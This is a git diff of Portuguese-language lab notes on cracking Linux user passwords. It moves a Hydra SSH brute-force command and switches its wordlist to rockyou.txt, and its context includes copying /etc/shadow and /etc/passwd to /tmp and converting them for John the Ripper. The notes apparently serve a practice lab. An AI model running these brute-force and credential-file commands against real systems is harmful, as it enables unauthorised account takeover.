@@ -60,6 +60,10 @@ done < "$USER_FILE"
 echo "Processo de criação de usuários concluído."
 
 ```
+## Executar Hydra para quebrar senhas de usuários via SSH (Kali Linux)
+```
+hydra -f -l name_user -P /usr/share/wordlists/rockyou.txt ssh://<Target_IP>
+```
 ## Copiar arquivos de usuários e senhas do Linux para pasta tmp
 ```
 sudo bash -c " \
@@ -70,10 +74,6 @@ cp /etc/shadow /tmp/shadow
 ## Converter arquivos de hash para o formato compativel do John The Ripper (Kali Linux)
 ```
 unshadow passwd shadow > hashes-linux.txt
-```
-## Executar Hydra para quebrar senhas de usuários via SSH (Kali Linux)
-```
-hydra -f -l name_user -P /usr/share/wordlists/john.lst ssh://<Target_IP>
 ```
 ## Executar John The Ripper para quebrar hashs das senhas dos usuários (Kali Linux)
 ```
@@ -112,7 +112,5 @@ while IFS= read -r user || [ -n "$user" ]; do
 done < "$1"
 
 echo "Processo de remoção de usuários concluído."
-
-
 
 ```
